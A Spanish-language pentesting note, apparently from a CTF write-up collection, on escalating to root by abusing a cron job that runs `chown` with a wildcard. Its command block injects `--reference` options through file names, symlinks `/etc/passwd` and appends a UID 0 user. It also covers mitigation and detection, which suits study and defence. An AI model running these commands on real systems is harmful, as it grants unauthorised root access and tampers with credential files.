---
topic: chown con comodín — cambio de propietario de archivos críticos
tags: [linux, chown, wildcard, symlink, cron, privesc, shrek]
---

# chown con comodín — cambio de propietario de archivos críticos

[🌐 English](chown-wildcard-privesc.en.md) | **Español**

## Concepto

Un script privilegiado que ejecuta `chown usuario:grupo *` expande el comodín con los nombres que haya en el directorio. Si el atacante puede crear archivos allí, controla esa lista. Un symlink a un archivo crítico hace que `chown` (que sigue enlaces por defecto) cambie el propietario del destino real; si el atacante puede escribir en él, escala. En Shrek, el cron ejecutaba `chown nobody:nobody *` sobre un directorio escribible y un symlink a `/etc/passwd` permitió añadir un usuario UID 0.

## Cuándo aplica

- Un cron o script con privilegios usa `chown`, `chmod` o `rm` con `*`.
- El directorio es escribible por un usuario sin privilegios.
- El comando sigue symlinks (por defecto en `chown` y `chmod`).
- Hay un archivo crítico cuyo propietario o permisos se pueden cambiar.

## Procedimiento

1. Enumerar tareas periódicas con `pspy` y los scripts de cron.
2. Localizar el comando con comodín y el directorio donde se ejecuta.
3. Comprobar si el directorio es escribible.
4. Crear un archivo de referencia propiedad del atacante y otro llamado `--reference=<referencia>`.
5. Crear un symlink con un nombre que el comodín incluya hacia el archivo objetivo.
6. Esperar la ejecución y comprobar el propietario.
7. Editar el archivo (por ejemplo `/etc/passwd`) y obtener root.

## Comandos

```bash
pspy -pf -i 1000
ls -la /ruta/del/cron
cd /ruta/escribible
touch ref.txt                  # propiedad del atacante
touch -- --reference=ref.txt   # opción inyectada en el comodín
ln -s /etc/passwd passwd       # chown sigue el enlace
# el cron ejecuta: chown nobody:nobody --reference=ref.txt passwd
ls -l /etc/passwd
echo 'pwned::0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned
```

```bash
# variante con opciones inyectadas en el nombre
touch -- '--reference=/etc/shadow'
```

## Variantes

- Inyectar opciones como `--reference` o `--from` en el nombre del archivo.
- Usar un nombre que empiece por `-` para alterar el comportamiento del comando.
- Aplicar la misma idea a `chmod`, `rm`, `tar` o `rsync` con comodines.
- Si el cron usa `find`, comprobar si sigue symlinks (`-L`).

## Limitaciones

- `chown -h` cambia el enlace, no el destino.
- Un `find ... -type f` excluye los symlinks.
- El directorio debe ser escribible y el cron debe ejecutarse como root.
- Algunos sistemas tienen `/etc/passwd` inmutable o protegido por SELinux.

## Mitigación

- Evitar comodines en scripts privilegiados; usar `find` con `-type f` y una ruta absoluta.
- Ejecutar `chown` con `-h` y `--` para separar opciones y nombres.
- Restringir la escritura en los directorios procesados por cron.
- Proteger `/etc/passwd`, `/etc/shadow` y `/etc/sudoers` con permisos e inmutabilidad.
- Auditar los cambios de propietario en archivos del sistema.

## Detección

- Symlinks nuevos en directorios procesados por cron.
- Cambios de propietario en `/etc/passwd`, `/etc/shadow` o `/etc/sudoers`.
- Nombres de archivo que empiezan por `-` o contienen `--`.
- Usuarios UID 0 añadidos fuera de una gestión de identidades.

## Referencias

- [Leon Juranic — Exploiting wildcards in Unix](https://www.exploit-db.com/papers/33930)
- [GTFOBins — chown](https://gtfobins.github.io/gtfobins/chown/)
- [0xdf — Shrek](https://0xdf.gitlab.io/2020/07/22/htb-shrek.html)
- [Ficha Shrek](../../machines/linux/shrek/README.md)
